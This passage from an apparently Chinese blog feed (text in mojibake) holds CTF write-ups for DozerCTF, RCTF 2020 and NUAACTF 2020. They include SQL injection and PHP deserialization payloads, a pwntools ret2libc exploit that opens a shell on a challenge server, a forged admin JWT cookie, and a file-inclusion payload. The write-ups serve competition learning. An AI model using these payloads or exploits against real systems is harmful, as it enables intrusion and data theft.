href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951</a><br>å¾—åˆ°payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%2527;handler &#96;uziuzi&#96; open as harvey;handler harvey read first;handler harvey close;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‹¿åˆ°flagï¼šflag{594cb6af684ad354b4a59ac496473990}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2245283226.png"></p><h2 id="pyå—ï¼Ÿ"><a href="#pyå—ï¼Ÿ" class="headerlink" title="pyå—ï¼Ÿ"></a>pyå—ï¼Ÿ</h2><p><a href="https://pan.baidu.com/s/1DWC0CkP2tIJciZ_7pnCgkw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šyq52ï¼‰</p><p>è€ƒæŸ¥lsbï¼Œstegä¸€ä¸‹å°±å®Œäº‹äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2379525671.png"></p><p>winhexæ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œb64å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1868969866.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4233888489.png"></p><h2 id="ç™½ç»™çš„ååºåˆ—åŒ–"><a href="#ç™½ç»™çš„ååºåˆ—åŒ–" class="headerlink" title="ç™½ç»™çš„ååºåˆ—åŒ–"></a>ç™½ç»™çš„ååºåˆ—åŒ–</h2><blockquote><p>é¢˜ç›®ï¼šä¸èƒ½å†ç®€å•äº†ï¼Œå†ç®€å•è‡ªæ€ï¼Œflagåœ¨flag.phpé‡Œé¢</p></blockquote><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/kevinbruce656/p/11198236.html">https://www.cnblogs.com/kevinbruce656/p/11198236.html</a></p><p>å¾—åˆ°payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O: <span class="number">4</span>:<span class="string">&quot;home&quot;</span>: <span class="number">2</span>:&#123;s: <span class="number">12</span>:<span class="string">&quot;%00home%00method&quot;</span>;s: <span class="number">5</span>:<span class="string">&quot;mysys&quot;</span>;s: <span class="number">10</span>:<span class="string">&quot;%00home%00args&quot;</span>;a: <span class="number">1</span>:&#123;i:<span class="number">0</span>;s: <span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‹¿åˆ°flagï¼šflag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><blockquote><p>é¢˜ç›®ï¼šwhere is the fileï¼Ÿï¼ˆflagæ ¼å¼Dozerctf{XXXXXXXXXXXXXXX}ï¼‰<br><a href="https://pan.baidu.com/s/11tWG9GJlR0HpOZnx07DRKA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šswrjï¼‰</p></blockquote><p>åˆ†æä¸€æ³¢æµé‡åŒ…å‘ç°æœ‰ä¸ªåŒ…ï¼Œæå–å‡ºæ¥æ˜¯ä¸ªåŠ å¯†çš„åŒ…<br>ä¸€å¼€å§‹åœ¨æµé‡åŒ…é‡Œé¢æŸ¥æ‰¾æ— æœï¼Œçœ‹æ¥åªèƒ½çˆ†ç ´äº†ï¼Œä½†åˆæ²¡è¯´å‡ ä½æ•°çš„å¯†ç ï¼Œå¤´å¤§<br>åæ¥å‚è€ƒ<a href="https://www.pianshen.com/article/8772313592/"><strong>æ–‡ç« </strong></a>ä¹‹åå‘ç°æ˜¯<a href="https://blog.harvey.plus/"><strong>crc</strong></a></p><h3 id="crcå·¥å…·ï¼ˆæå–ç ï¼š926kï¼‰"><a href="#crcå·¥å…·ï¼ˆæå–ç ï¼š926kï¼‰" class="headerlink" title="crcå·¥å…·ï¼ˆæå–ç ï¼š926kï¼‰"></a><a href="https://pan.baidu.com/s/1urmCS9YptKbezcw4UPf8Mw">crcå·¥å…·</a>ï¼ˆæå–ç ï¼š926kï¼‰</h3><p>æ¥ç€çˆ†ç ´å‡ºCRCä¸€æ ·çš„æ–‡æœ¬å°±èƒ½å¾—åˆ°åŸæ–‡äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4283477376.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/789171801.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2919689297.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/599867676.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/458036917.png"></p><p>æœ€ç»ˆç»„åˆä¸€ä¸‹å¾—åˆ°flagï¼šDozerctf{can_U_find_thefilefrom_traffic}</p><h2 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h2><blockquote><p>é¢˜ç›®ï¼šåº”è¯¥æ˜¯æ¯”è¾ƒå®¹æ˜“çš„mazeäº†å§ï¼æœ€ç»ˆç»“æœè¯·ä»¥Dozerctf{}æ ¼å¼æäº¤ã€‚<br><a href="https://pan.baidu.com/s/1hW88fk3VMC_4QgEW30_cVA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š5t57ï¼‰</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3495341980.png"></p><p>æœ€åmd5åŠ å¯†å¾—åˆ°flag:Dozerctf{e2b94144f06fdb08695065331d44b59e}<br>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">str2&#x3D;[]</span><br><span class="line">str3&#x3D;[&#39;W&#39;,&#39;A&#39;,&#39;S&#39;,&#39;D&#39;]</span><br><span class="line">def en1():</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;s</span><br><span class="line">def en2():</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;s</span><br><span class="line">def en3():</span><br><span class="line">    s&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;s</span><br><span class="line">    s&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;s</span><br><span class="line">def en4():</span><br><span class="line">    s&#x3D;str3[3]</span><br><span class="line">    str3[3]&#x3D;str3[2]</span><br><span class="line">    str3[2]&#x3D;str3[1]</span><br><span class="line">    str3[1]&#x3D;str3[0]</span><br><span class="line">    str3[0]&#x3D;s</span><br><span class="line">def start():</span><br><span class="line">    str4&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(len(str2)):</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;W&#39;:</span><br><span class="line">            str4+&#x3D;str3[0]</span><br><span class="line">            en1()</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;A&#39;:</span><br><span class="line">            str4+&#x3D;str3[1]</span><br><span class="line">            en2()</span><br><span class="line">       if str2[i]&#x3D;&#x3D;&#39;S&#39;:</span><br><span class="line">            str4+&#x3D;str3[2]</span><br><span class="line">            en3()</span><br><span class="line">        if str2[i]&#x3D;&#x3D;&#39;D&#39;:</span><br><span class="line">            str4+&#x3D;str3[3]</span><br><span class="line">            en4()</span><br><span class="line">    return str4</span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    str1&#x3D;input(&#39;è¯·è¾“å…¥ç§»åŠ¨å­—ç¬¦(WSADä¸Šä¸‹å·¦å³):&#39;)</span><br><span class="line">    for c in str1:</span><br><span class="line">        str2.append(c)</span><br><span class="line">    print(start())</span><br></pre></td></tr></table></figure><h2 id="ret-temp"><a href="#ret-temp" class="headerlink" title="ret temp"></a>ret temp</h2><blockquote><p>é¢˜ç›®ï¼šåˆ«å‚¬äº†åˆ«å‚¬äº†ï¼Œä½ ä»¬è¦çš„ç®€å•é¢˜<br>nc 118.31.11.216 36666<br><a href="https://pan.baidu.com/s/1y0JOb3zPrkzwB6osgz1l8A"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šbg61ï¼‰</p></blockquote><p>expï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">conn&#x3D;remote(&#39;118.31.11.216&#39;,36666)</span><br><span class="line">#conn&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">e&#x3D;ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">pad&#x3D;112</span><br><span class="line">write_plt&#x3D;e.symbols[&#39;write&#39;]</span><br><span class="line">vul_addr&#x3D;e.sym[&#39;_start&#39;]</span><br><span class="line">bss_addr&#x3D;e.bss()</span><br><span class="line">def leak(address):</span><br><span class="line">    payload1&#x3D;&#39;a&#39;*pad+&quot;BBBB&quot;+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data&#x3D;conn.recv(4)</span><br><span class="line">    return data </span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;e)</span><br><span class="line">system_addr&#x3D;d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_plt&#x3D;e.symbols[&#39;read&#39;]</span><br><span class="line">payload2&#x3D;&#39;a&#39;*pad+&quot;BBBB&quot;+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload3&#x3D;&quot;a&quot;*pad+&quot;BBBB&quot;+p32(system_addr)+&#39;dead&#39;+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h2 id="è²Œä¼¼æœ‰äº›ä¸å¯¹"><a href="#è²Œä¼¼æœ‰äº›ä¸å¯¹" class="headerlink" title="è²Œä¼¼æœ‰äº›ä¸å¯¹"></a>è²Œä¼¼æœ‰äº›ä¸å¯¹</h2><blockquote><p>é¢˜ç›®ï¼šè¿™æ˜¯è°çš„è¯¾ç¨‹è®¾è®¡ï¼Ÿåšçš„å¥½çƒ‚ï¼<br><a href="https://pan.baidu.com/s/1naGkAx9_u25mvM27DHNdQQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š71kaï¼‰</p></blockquote><p>æºæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹é‡Œé¢çš„å­—ç¬¦ä¸²ï¼Œæœ‰baseæ›¿æ¢å­—ç¬¦å’Œå¯†æ–‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3664153200.png"></p><p>æœ€åb64å¾—åˆ°flagï¼šDozerctf{old_man_is_good_man!}<br>è„šæœ¬å‚ç…§ï¼š<a href="https://blog.csdn.net/hackerwin7/article/details/44749487">https://blog.csdn.net/hackerwin7/article/details/44749487</a><br>ï¼ˆå¯†ç è¡¨æ¢æˆç¨‹åºé‡Œé¢çš„å°±oäº†ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF 2020</title>
      <link href="2020/06/05/2020RCTF/"/>
      <url>2020/06/05/2020RCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4123070677.png"></p><center>èµ›å‰</center><h1 id="Welcome-to-the-RCTF-2020"><a href="#Welcome-to-the-RCTF-2020" class="headerlink" title="Welcome to the RCTF 2020"></a>Welcome to the RCTF 2020</h1><p>ç§‘å­¦ä¸Šç½‘ï¼Œè¿›ç¾¤å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/820402767.png"></p><h2 id="èµ›åï¼ˆçˆ·æ˜¯æ‡’ç‹—"><a href="#èµ›åï¼ˆçˆ·æ˜¯æ‡’ç‹—" class="headerlink" title="èµ›åï¼ˆçˆ·æ˜¯æ‡’ç‹—"></a>èµ›åï¼ˆçˆ·æ˜¯æ‡’ç‹—</h2><h1 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h1><p><a href="https://pan.baidu.com/s/1uAyMhXXAm178ZSIsSlT6BQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š5szjï¼‰</p><p>ä¸æ„§æ˜¯æ‚é¡¹ï¼Œè®¤è°±<br>çˆ·ä¸ä¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3224104186.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3445341039.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3769664051.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/877345846.png"></p><blockquote><p>æ•¢é—®å‡ºé¢˜äººä½ æ”¶åˆ°çš„æ¦”å¤´èƒ½å¦å¼€è¿é”åº—äº†qwq</p></blockquote><h1 id="Animal"><a href="#Animal" class="headerlink" title="Animal"></a>Animal</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1403331967.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3680391772.png"></p><p><a href="https://pan.baidu.com/s/1Mo-MTAlYngwvd1FI4npcqA"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š1689ï¼‰</p><p>å‹ç¼©åŒ…åŠ å¯†äº†ï¼Œéœ€è¦æ‰“å¼€Messageå¾—åˆ°å¯†ç <br>çœ‹è¿‡wpçŸ¥é“ä»–æ˜¯æ‘©æ–¯å¯†ç <br>delay(500)ä¸ºâ€˜-â€™ ï¼Œ delay(200)ä¸ºâ€˜.â€™<br>æ¥ç€æŒ‰è°ƒç”¨é¡ºåºæ‹“å±•</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/901735005.png"></p><p>è§£å¯†å¾—åˆ°ï¼šCQCQCQDEKDEK88SKSKï¼ˆ<a href="https://en.wikipedia.org/wiki/Morse_code_abbreviations"><strong>å‚è€ƒæ–‡ç« </strong></a>ï¼‰ï¼ˆç§‘å­¦ä¸Šç½‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3791110576.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/255167370.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1803295814.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3855881060.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2533855544.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1296790193.png"></p><p>è§£å‹ä¹‹åæ‹¿åˆ°cfaå’Œä¸€ä¸ªäºŒç»´ç ï¼ŒäºŒç»´ç æ˜¯çƒŸé›¾å¼¹<br>æµé‡åˆ†æcfaè“ç‰™æ–‡ä»¶æå–å‡ºå››å¼ å›¾ç‰‡ï¼Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ªsecretå›¾ç‰‡<br>stegdetectåˆ¤æ–­ä¸ºjphideè§£å¯†<br>steghideè§£å¯†åæ‹¿åˆ°å­—ç¬¦ä¸²<br>aHR0cHMlM0EvL216bC5sYS8yV0VqbjVh<br>base64è§£å¯†å¾—åˆ°çŸ­é“¾<br><a href="https://mzl.la/2WEjn5a">https://mzl.la/2WEjn5a</a><br>è·³è½¬åæ˜¯ä¸€ä¸ªemojiåŠ å¯†ï¼Œå¯†é’¥æŒ¨ä¸ªç‚¹è¿‡å»ï¼ˆåï¼Œå‘ç°æ˜¯ä¸€æœ¬ä¹¦ï¼Œè§£å¯†å³å¯~</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAACTF 2020</title>
      <link href="2020/05/31/2020-NUAA-CTF/"/>
      <url>2020/05/31/2020-NUAA-CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šçˆ·æ˜¯æ‡’ç‹—ï¼Œå‰©ä¸‹çš„é¢˜æ‡’å¾—å¤ç°äº†ï¼Œå°±ç›´æ¥å‘å®˜æ–¹wp</p><p><a href="http://harvey.plus/wp/2020-NUAACTF-SZCup-master.zip"><strong>2020NUAACTFå®˜æ–¹wp</strong></a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><blockquote><p>é¢˜ç›®ï¼šç­¾åˆ°å°±å®Œäº‹äº† <a href="http://139.9.221.0:8086/">http://139.9.221.0:8086</a></p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>æ­¤é¢˜è€ƒæŸ¥curlå‘½ä»¤ï¼Œcurlä¸€ä¸‹ç›´æ¥å‡ºflag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/710244822.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/506724736.png"></p><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><blockquote><p>é¢˜ç›®ï¼šç‹¸çŒ«æ¢å¤ªå­ï¼Ÿå˜¤å˜¤å˜¤ è¦æ‹¿flagï¼Œä½ éœ€è¦æˆä¸ºadmin <a href="http://139.9.221.0:8090/">http://139.9.221.0:8090/</a></p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>è€ƒæŸ¥jwt<br>æ‰“å¼€ç½‘é¡µå°±æ˜¯ä¸ªç®€é™‹çš„ç™»å½•ç•Œé¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2912757567.png"></p><p>é¦–å…ˆéœ€è¦jwtçˆ†ç ´å¾—åˆ°secret<br>æ¥ç€é‡æ–°ç»„è£…jwtï¼Œç„¶åæ›¿æ¢åŸæ¥çš„</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1187502005.png"></p><p>æ³¨å†Œç™»å½•ï¼Œæ‰¾åˆ°å…¶cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/798635598.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2947966423.png"></p><h4 id="åœ¨çº¿å·¥å…·"><a href="#åœ¨çº¿å·¥å…·" class="headerlink" title="åœ¨çº¿å·¥å…·"></a><a href="https://jwt.io/"><strong>åœ¨çº¿å·¥å…·</strong></a></h4><p>è¾“å…¥æ‰€å¾—åˆ°çš„çš„secretå’Œjwtï¼Œç„¶åæ”¹ç”¨æˆ·åä¸ºadmin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1321619984.png"></p><p>æœ€åä¿®æ”¹cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA&quot;</span><br></pre></td></tr></table></figure><p>åˆ·æ–°å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4156064202.png"></p><h2 id="easypop"><a href="#easypop" class="headerlink" title="easypop"></a>easypop</h2><blockquote><p>é¢˜ç›®ï¼š<a href="http://139.9.221.0:8088/">http://139.9.221.0:8088/</a></p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>ä»£ç å®¡è®¡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3843348484.png"></p><p>è¿è¡ŒPHPä»£ç ï¼Œå¾—åˆ°payload<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1855814344.png"></p><p>æœ‰ä¸ªdçš„å‚æ•°å¯ä»¥ä¼ å‚ï¼Œäºæ˜¯åŠ ä¸Š?d=payloadï¼Œå¾—åˆ°æœ€ç»ˆçš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1996209671.png"></p><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><blockquote><p>é¢˜ç›®ï¼š<a href="http://139.9.221.0:8092/">http://139.9.221.0:8092/</a></p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>æ–‡ä»¶åŒ…å«ï¼Œä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿‡æ»¤äº†flagï¼Œä¹Ÿè¿‡æ»¤äº†dataæ²¡æ³•ç›´æ¥è¯»ï¼Œçœ‹åˆ°createfun.phpï¼Œå†å¾—åˆ°å…¶æºç ï¼Œreadfileå»è¯»flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/367624342.png"></p><p>urlå‡ºç°?file=index  <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3937660028.png"></p><p>æ–‡ä»¶è¯»å–  <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3088521944.png"></p><p>è§£ç åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  error_reporting(0);</span><br><span class="line">   @$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">   if(isset($file)) &#123;      if(preg_match(&#39;&#x2F;http|data|ftp|input|%00|flag&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;100) &#123;</span><br><span class="line">           echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">       &#125; </span><br><span class="line">       else &#123;</span><br><span class="line">           include($file.&#39;.php&#39;);</span><br><span class="line">           setcookie(&quot;tips&quot;,&quot;createfun.php&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; </span><br><span class="line">   else &#123;</span><br><span class="line">       header(&#39;Location:include.php?file&#x3D;index&#39;);</span><br><span class="line">   &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure><p>æç¤ºcreatefun.phpï¼Œå†è¯»ä¸€æ¬¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$func &#x3D; @$_GET[&#39;func&#39;];</span><br><span class="line">$arg &#x3D; @$_GET[&#39;arg&#39;];</span><br><span class="line">if(isset($func)&amp;&amp;isset($arg))    &#123;$func($arg,&#39;&#39;);&#125;</span><br><span class="line">readfile(&quot;flag.php&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure><p>payloadï¼š <code>createfun.php?func=show_source&amp;arg=flag.php</code><br>æœ€åå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3334144245.png"></p><h2 id="web5ï¼ˆå®‰æ’å››æœˆèµ›åŸé¢˜ï¼‰"><a href="#web5ï¼ˆå®‰æ’å››æœˆèµ›åŸé¢˜ï¼‰" class="headerlink" title="web5ï¼ˆå®‰æ’å››æœˆèµ›åŸé¢˜ï¼‰"></a>web5ï¼ˆå®‰æ’å››æœˆèµ›åŸé¢˜ï¼‰</h2><blockquote><p>é¢˜ç›®ï¼š<a href="http://139.9.221.0:8094/">http://139.9.221.0:8094/</a></p></blockquote><p>è§£é¢˜æ€è·¯ï¼š<br>popé“¾ + ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/963610115.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_nohack</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;flflagag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> C();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;fflaglag.php&quot;;&#125;&#125;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo serialize(new B());</span></span><br><span class="line"><span class="keyword">echo</span> filter_nohack(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="å‡ç¬‘ç”·å­©"><a href="#å‡ç¬‘ç”·å­©" class="headerlink" title="å‡ç¬‘ç”·å­©"></a>å‡ç¬‘ç”·å­©</h2><blockquote><p>é¢˜ç›®ï¼šå½“ä½ 